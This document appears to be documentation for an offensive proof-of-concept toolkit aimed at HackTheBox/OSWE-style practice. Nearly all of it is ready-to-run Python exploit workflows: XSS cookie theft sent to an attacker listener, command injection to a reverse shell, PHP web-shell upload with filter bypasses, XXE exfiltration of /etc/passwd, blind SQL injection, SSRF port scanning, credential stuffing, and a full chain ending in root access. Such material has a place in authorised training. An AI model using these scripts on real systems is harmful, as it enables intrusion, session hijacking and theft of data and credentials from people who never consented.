Workflows
=========

End-to-end POC workflows for common exploitation scenarios.

XSS Cookie Stealer
------------------

Complete workflow for stealing cookies via XSS:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.xss import cookie_stealer
   from utils.server_hooks import get_cookie
   from utils.cookie import parse_cookie_string

   def exploit_xss(target, lhost, lport=8000):
       """Steal admin cookie via stored XSS"""

       # 1. Start server (in separate terminal)
       #    python -m poc.servers.server

       # 2. Generate XSS payload
       payload = cookie_stealer(f"http://{lhost}:{lport}")
       out.info(f"Payload: {payload}")

       # 3. Send payload to vulnerable endpoint
       out.status("Injecting XSS payload...")
       r = requests.post(
           f"{target}/comment",
           data={"content": payload},
           allow_redirects=False
       )

       if r.status_code == 302:
           out.success("Payload injected successfully")

       # 4. Wait for admin to visit and trigger callback
       out.status("Waiting for admin to view comment...")
       cookie_str = get_cookie(timeout=60)

       if not cookie_str:
           out.error("No callback received - admin may not have visited")
           return False

       out.success(f"Cookie captured: {cookie_str}")

       # 5. Parse and use stolen cookie
       cookies = parse_cookie_string(cookie_str)

       # 6. Access admin panel
       out.status("Accessing admin panel with stolen cookie...")
       r = requests.get(f"{target}/admin", cookies=cookies)

       if "Admin Panel" in r.text or r.status_code == 200:
           out.success("Successfully accessed admin panel!")
           return True
       else:
           out.error("Cookie didn't grant admin access")
           return False

   if __name__ == "__main__":
       exploit_xss("http://target.local", "10.10.14.5")

RCE to Interactive Shell
-------------------------

From command injection to full PTY shell:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.reverse_shells import python_oneliner, bash_shell
   from utils.shell_catcher import auto_shell

   def exploit_rce(target, lhost, lport=4444):
       """Exploit RCE and get interactive shell"""

       # Generate shell payload
       cmd = python_oneliner(lhost, lport)
       out.info(f"Payload: {cmd}")

       # Catch shell automatically
       with auto_shell(lport) as catcher:
           # Trigger RCE
           out.status("Triggering RCE...")
           r = requests.post(
               f"{target}/api/run",
               json={"command": cmd},
               timeout=5
           )

           # Wait for shell
           out.status(f"Waiting for shell on port {lport}...")

           # Automatically upgrades to PTY and gives interactive shell
           if catcher.shell_caught:
               out.success("Shell caught!")
               catcher.stabilize()  # Upgrade to PTY
               out.info("Shell stabilized. Entering interactive mode...")
               catcher.interact()   # Full interactive shell!
           else:
               out.error("No shell received")

   if __name__ == "__main__":
       exploit_rce("http://target.local", "10.10.14.5")

File Upload to RCE
------------------

Upload malicious file and get shell:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.file_upload import FileUploader
   from utils.reverse_shells import php_shell
   from utils.shell_catcher import quick_catch

   def exploit_upload(target, lhost, lport=4444):
       """Upload PHP shell and execute it"""

       # Generate PHP reverse shell
       shell_path = php_shell(lhost, lport)
       out.info(f"Generated shell at: {shell_path}")

       # Read shell content
       with open(f'payloads/{shell_path}', 'rb') as f:
           shell_code = f.read()

       # Upload with bypass techniques
       out.status("Uploading shell...")
       uploader = FileUploader(f"{target}/upload")

       result = uploader.upload_with_bypass(
           "shell.php",
           shell_code,
           techniques=["double_extension", "null_byte"]
       )

       if result.status_code != 200:
           out.error("Upload failed")
           return

       out.success("Shell uploaded!")

       # Trigger execution and catch shell
       def trigger():
           out.status("Triggering shell execution...")
           requests.get(f"{target}/uploads/shell.php", timeout=2)

       quick_catch(lport, trigger_func=trigger)

   if __name__ == "__main__":
       exploit_upload("http://target.local", "10.10.14.5")

XXE Data Exfiltration
---------------------

Read files via XXE:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.xxe import quick_test
   from utils.server_hooks import get_exfil

   def exploit_xxe(target, lhost, lport=8000):
       """Exfiltrate /etc/passwd via XXE"""

       # 1. Start server (in separate terminal)
       #    python -m poc.servers.server

       # 2. Generate XXE payload (also creates DTD file)
       payload = quick_test(f"http://{lhost}:{lport}", "/etc/passwd")
       out.info("XXE payload generated")

       # 3. Send XXE payload
       out.status("Sending XXE payload...")
       r = requests.post(
           f"{target}/api/parse",
           data=payload,
           headers={"Content-Type": "application/xml"}
       )

       # 4. Wait for exfil callback
       out.status("Waiting for data exfiltration...")
       data = get_exfil(timeout=30)

       if data:
           out.success("Data exfiltrated!")
           out.raw("\\n" + "="*50)
           out.raw(data)
           out.raw("="*50 + "\\n")
           return data
       else:
           out.error("No data received")
           return None

   if __name__ == "__main__":
       exploit_xxe("http://target.local", "10.10.14.5")

Blind SQL Injection
-------------------

Extract data from blind SQLi:

.. code-block:: python

   import requests
   import string
   from utils.output import out
   from utils.timing import time_request

   def exploit_sqli_blind(target):
       """Extract database name via boolean-based blind SQLi"""

       def check_condition(condition):
           """Returns True if condition is true"""
           r = requests.get(
               f"{target}/api/user",
               params={"id": f"1' AND {condition}--"}
           )
           return "Welcome" in r.text

       # Extract database name
       db_name = ""
       charset = string.ascii_lowercase + string.digits + "_"

       out.info("Extracting database name...")

       for pos in range(1, 33):
           found = False
           for char in charset:
               condition = f"SUBSTRING(DATABASE(),{pos},1)='{char}'"

               if check_condition(condition):
                   db_name += char
                   out.status(f"Database: {db_name}")
                   found = True
                   break

           if not found:
               break

       out.success(f"Database name: {db_name}")
       return db_name

   def exploit_sqli_time(target):
       """Extract data via time-based blind SQLi"""

       def check_char(pos, char):
           """Returns True if char at position matches"""
           payload = f"1' AND IF(SUBSTRING(DATABASE(),{pos},1)='{char}',SLEEP(3),0)--"

           def attempt():
               return requests.get(f"{target}/api/user", params={"id": payload}, timeout=10)

           duration = time_request(attempt, payload)
           return duration > 3

       db_name = ""
       charset = string.ascii_lowercase + string.digits + "_"

       out.info("Extracting database name (time-based)...")

       for pos in range(1, 33):
           found = False
           for char in charset:
               if check_char(pos, char):
                   db_name += char
                   out.status(f"Database: {db_name}")
                   found = True
                   break

           if not found:
               break

       out.success(f"Database name: {db_name}")
       return db_name

   if __name__ == "__main__":
       # Boolean-based
       exploit_sqli_blind("http://target.local")

       # Time-based
       exploit_sqli_time("http://target.local")

SSRF to Internal Access
------------------------

Exploit SSRF to access internal services:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.batch_request import batch_request_sync, generate_param_payloads
   import httpx

   def exploit_ssrf(target):
       """Use SSRF to scan internal network"""

       # 1. Test SSRF vulnerability
       out.info("Testing SSRF...")
       test_url = "http://127.0.0.1:80"
       r = requests.get(f"{target}/fetch", params={"url": test_url})

       if r.status_code == 200:
           out.success("SSRF confirmed!")
       else:
           out.error("SSRF test failed")
           return

       # 2. Scan internal ports
       out.status("Scanning internal ports...")
       client = httpx.Client()

       base = client.build_request("GET", f"{target}/fetch")

       # Common internal service ports
       ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
       internal_urls = [f"http://127.0.0.1:{port}" for port in ports]

       results = batch_request_sync(
           base,
           payloads=generate_param_payloads("url", internal_urls),
           validate=lambda r: r.status_code == 200 and len(r.text) > 100,
           concurrency=5
       )

       # Show open ports
       out.info("\\nOpen internal ports:")
       for result in results:
           if result.matched:
               port = result.payload['params']['url'].split(':')[-1]
               out.success(f"Port {port} is open")

       # 3. Try to access internal admin panel
       out.status("\\nTrying internal admin panel...")
       r = requests.get(
           f"{target}/fetch",
           params={"url": "http://127.0.0.1:8080/admin"}
       )

       if "admin" in r.text.lower():
           out.success("Accessed internal admin panel!")
           out.raw(r.text[:500])

   if __name__ == "__main__":
       exploit_ssrf("http://target.local")

Credential Stuffing
-------------------

Test multiple credentials efficiently:

.. code-block:: python

   import httpx
   from utils.output import out
   from utils.batch_request import batch_request_sync, generate_json_payloads

   def credential_stuffing(target):
       """Test common credential pairs"""

       # Common credentials
       creds = [
           {"username": "admin", "password": "admin"},
           {"username": "admin", "password": "password"},
           {"username": "admin", "password": "admin123"},
           {"username": "root", "password": "root"},
           {"username": "administrator", "password": "administrator"},
           {"username": "test", "password": "test"},
       ]

       out.info(f"Testing {len(creds)} credential pairs...")

       client = httpx.Client()
       base = client.build_request(
           "POST",
           f"{target}/api/login",
           json={"username": "", "password": ""}
       )

       # Test all credentials
       results = batch_request_sync(
           base,
           payloads=[{"json": cred} for cred in creds],
           validate=lambda r: r.status_code == 200 and "token" in r.text,
           concurrency=3  # Be gentle with login endpoints
       )

       # Show valid credentials
       for result in results:
           if result.matched:
               creds = result.payload['json']
               out.success(f"Valid creds: {creds['username']}:{creds['password']}")

   if __name__ == "__main__":
       credential_stuffing("http://target.local")

Complete HTB/OSWE Workflow
--------------------------

Full exploitation chain:

.. code-block:: python

   import requests
   from utils.output import out
   from utils.html_parser import HTMLParser
   from utils.xss import cookie_stealer
   from utils.server_hooks import get_cookie
   from utils.cookie import parse_cookie_string
   from utils.file_upload import FileUploader
   from utils.reverse_shells import php_shell
   from utils.shell_catcher import auto_shell

   def full_exploit(target, lhost):
       """Complete exploitation chain"""

       # Stage 1: Reconnaissance
       out.info("Stage 1: Reconnaissance")
       r = requests.get(target)
       parser = HTMLParser.from_response(r)

       # Find forms
       forms = parser.find_forms()
       out.success(f"Found {len(forms)} forms")

       # Find upload endpoint
       upload_form = None
       for form in forms:
           if 'upload' in form.get('action', '').lower():
               upload_form = form
               break

       if not upload_form:
           out.error("No upload form found")
           return

       # Stage 2: XSS to steal admin cookie
       out.info("\\nStage 2: XSS Cookie Theft")
       payload = cookie_stealer(f"http://{lhost}:8000")

       requests.post(f"{target}/comment", data={"msg": payload})
       out.status("Waiting for admin...")

       cookie_str = get_cookie(timeout=60)
       if not cookie_str:
           out.error("No cookie received")
           return

       out.success("Cookie captured!")
       cookies = parse_cookie_string(cookie_str)

       # Stage 3: File upload with stolen session
       out.info("\\nStage 3: File Upload")
       shell_path = php_shell(lhost, 4444)

       with open(f'payloads/{shell_path}', 'rb') as f:
           shell_code = f.read()

       uploader = FileUploader(f"{target}/upload")
       result = uploader.upload(
           "shell.php",
           shell_code,
           cookies=cookies
       )

       if result.status_code != 200:
           out.error("Upload failed")
           return

       out.success("Shell uploaded!")

       # Stage 4: Get interactive shell
       out.info("\\nStage 4: Shell Execution")

       with auto_shell(4444) as catcher:
           requests.get(f"{target}/uploads/shell.php", timeout=2)

           if catcher.shell_caught:
               out.success("Root access achieved!")
               catcher.stabilize()
               catcher.interact()

   if __name__ == "__main__":
       full_exploit("http://target.local", "10.10.14.5")
